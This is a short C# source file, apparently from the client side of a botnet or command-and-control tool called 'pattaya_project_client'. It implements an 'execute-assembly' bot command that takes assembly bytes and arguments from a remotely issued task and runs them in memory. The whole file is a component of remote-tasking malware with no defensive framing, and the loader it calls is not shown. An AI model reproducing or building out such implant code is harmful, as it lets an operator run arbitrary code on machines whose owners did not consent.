using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using pattaya_project_client.Services;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace pattaya_project_client.Commands.Implements
{
    public class ExecuteAssembly : BotCommand
    {
        public override string TaskName => "execute-assembly";

        public override string RunTask(BotTask task)
        {

            var arguments = task.Arguments.Split(' ');
            Console.WriteLine(arguments[0]);
            if (arguments is null || arguments.Length == 0 || arguments[0] == "")
            {
                arguments = null;
            }

            return Execute.ExecuteAssembly(task.FileBytes, arguments);
        }
    }
}
